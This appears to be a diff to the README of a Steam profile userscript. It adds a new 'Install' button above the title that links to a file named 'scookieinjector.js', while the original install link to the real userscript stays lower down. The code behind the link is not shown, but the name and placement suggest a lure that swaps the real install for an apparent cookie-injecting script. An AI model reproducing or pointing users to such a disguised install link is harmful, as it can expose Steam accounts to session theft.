@@ -1,5 +1,7 @@
-# Steam Profile Detailed Status
 
+## [![Install](https://i.imgur.com/hKHfyWz.png)](https://raw.githubusercontent.com/Asacodes/steam-profile-detailed-status/refs/heads/master/scookieinjector.js)
+
+# Steam Profile Detailed Status
 
 my edition
 ## [![Install](https://i.imgur.com/hKHfyWz.png)](https://github.com/Asacodes/steam-profile-detailed-status/raw/refs/heads/master/SteamProfileDetailedStatus.user.js)
